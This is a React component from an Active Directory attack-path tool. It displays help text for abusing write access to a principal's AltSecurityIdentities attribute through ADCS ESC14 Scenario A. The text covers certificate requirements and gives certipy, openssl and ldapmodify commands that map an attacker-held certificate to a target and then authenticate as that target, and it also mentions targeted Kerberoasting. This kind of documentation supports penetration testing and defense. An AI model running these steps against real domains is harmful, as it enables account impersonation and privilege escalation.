// Copyright 2025 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Link, Typography } from '@mui/material';
import { FC } from 'react';
import CodeController from '../CodeController/CodeController';
import { EdgeInfoProps } from '../index';

const LinuxAbuse: FC<EdgeInfoProps> = () => {
    return (
        <>
            <Typography variant='body2'>
                The write access to the AltSecurityIdentities may enable an ADCS ESC14 Scenario A attack.
            </Typography>
            <Typography variant='body2'>
                Alternatively, the write access to the SPN enable a targeted Kerberoasting attack against user accounts
                with a weak password. See the{' '}
                <Link target='_blank' rel='noopener' href='https://bloodhound.specterops.io/resources/edges/write-spn'>
                    WriteSPN
                </Link>{' '}
                edge for more details.
            </Typography>
            <Typography variant='body2'>
                An attacker can add an explicit certificate mapping in the AltSecurityIdentities of the target referring
                to a certificate in the attacker's possession, and then use this certificate to authenticate as the
                target.
            </Typography>
            <Typography variant='body2'>
                The certificate must meet the following requirements:
                <ol style={{ listStyleType: 'decimal', paddingLeft: '1.5em' }}>
                    <li>Chain up to trusted root CA on the DC</li>
                    <li>Enhanced Key Usage extension contains an EKU that enables domain authentication</li>
                    <li>Subject Alternative Name (SAN) does NOT contain a "Other Name/Principal Name" entry (UPN)</li>
                </ol>
                <p className='my-4'>
                    The EKUs that enable domain authentication over Kerberos:
                    <ul style={{ paddingLeft: '1.5em' }}>
                        <li>Client Authentication (1.3.6.1.5.5.7.3.2)</li>
                        <li>PKINIT Client Authentication (1.3.6.1.5.2.3.4)</li>
                        <li>Smart Card Logon (1.3.6.1.4.1.311.20.2.2)</li>
                        <li>Any Purpose (2.5.29.37.0)</li>
                        <li>SubCA (no EKUs)</li>
                    </ul>
                </p>
                <p className='my-4'>
                    The last certificate requirement means that user certificates will not work, so the certificate
                    typically must be of a computer. By default, the ADCS certificate template <i>Computer (Machine)</i>{' '}
                    meets these requirements and grants Domain Computers enrollment rights. The target can still be a
                    user.
                </p>
                The last requirement does not have to be met if a DC has UPN mapping disabled (see{' '}
                <Link
                    target='_blank'
                    rel='noopener'
                    href='https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/ff520074(v=ws.10)'>
                    How to disable the Subject Alternative Name for UPN mapping
                </Link>
                ).
            </Typography>
            <Typography variant='body1'>Step 1: Obtain certificate</Typography>
            <Typography variant='body2'>
                Obtain a certificate meeting the above requirements for example by dumping a certificate from a
                computer, or enrolling a new certificate as a computer:
            </Typography>
            <Typography component={'pre'}>
                {'certipy req -u computername -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC14'}
            </Typography>
            <Typography variant='body2'>
                If the enrollment fails with an error message stating that the Email or DNS name is unavailable and
                cannot be added to the Subject or Subject Alternate name, then it is because the enrollee principal does
                not have their mail or dNSHostName attribute set, which is required by the certificate template. The
                mail attribute can be set on both user and computer objects but the dNSHostName attribute can only be
                set on computer objects. Computers have validated write permission to their own dNSHostName attribute by
                default, but neither users nor computers can write to their own mail attribute by default.
            </Typography>
            <Typography variant='body1'>Step 2: Get certificate mapping identifier</Typography>
            <Typography variant='body2'>
                The abuse is possible with the strong explicit certificate mappings X509IssuerSerialNumber or
                X509SHA1PublicKey. In this example, we use X509SHA1PublicKey.
            </Typography>
            <Typography variant='body2'>Get the SHA1 hash of the certificate using openssl:</Typography>
            <CodeController>
                {`openssl pkcs12 -info -in computername.pfx -nokeys | openssl x509 -noout -sha1 -fingerprint | tr -d ':' | tr '[:upper:]' '[:lower:]'
…
sha1 fingerprint=f61331a504cff8cb5e60c269632c31aa3032a54a`}
            </CodeController>
            <Typography variant='body1'>Step 3: Add certificate mapping on target</Typography>
            <Typography variant='body2'>
                Use ldapmodify to add the explicit certificate mapping string to the 'altSecurityIdentities' attribute
                of the target principal:
            </Typography>
            <Typography component={'pre'}>
                {
                    'echo -e "dn: CN=Target,CN=Users,DC=forestroot,DC=com\\nchangetype: modify\\nadd: altSecurityIdentities\\naltSecurityIdentities: X509:<SHA1-PUKEY>f61331a504cff8cb5e60c269632c31aa3032a54a" | ldapmodify -x -D "CN=Attacker,CN=Users,DC=forestroot,DC=com" -w \'PWD\' -h forestroot.com'
                }
            </Typography>
            <Typography variant='body2'>Verify the that the mapping was added using ldapsearch:</Typography>
            <Typography component={'pre'}>
                {
                    'ldapsearch -x -D "CN=Attacker,CN=Users,DC=forestroot,DC=com" -w \'PWD\' -h "forestroot.com" -b "CN=Target,CN=Users,DC=forestroot,DC=com" altSecurityIdentities'
                }
            </Typography>
            <Typography variant='body1'>Step 4: Authenticate as target</Typography>
            <Typography variant='body2'>
                Request a ticket granting ticket (TGT) from the domain using Certipy, specifying the certificate and the
                IP of a DC:
            </Typography>
            <Typography component={'pre'}>{'certipy auth -pfx computername.pfx -dc-ip 172.16.126.128'}</Typography>
            <Typography variant='body1'>Step 5: Remove certificate mapping on target (clean-up)</Typography>
            <Typography variant='body2'>
                After the execution of the abuse, use ldapmodify to remove the explicit certificate mapping string from
                the ‘altSecurityIdentities’ attribute of the target principal:
            </Typography>
            <Typography component={'pre'}>
                {
                    'echo -e "dn: CN=Target,CN=Users,DC=forestroot,DC=com\\nchangetype: modify\\ndelete: altSecurityIdentities\\naltSecurityIdentities: X509:<SHA1-PUKEY>f61331a504cff8cb5e60c269632c31aa3032a54a" | ldapmodify -x -D "CN=Attacker,CN=Users,DC=forestroot,DC=com" -w \'PWD\' -h forestroot.com'
                }
            </Typography>
        </>
    );
};

export default LinuxAbuse;
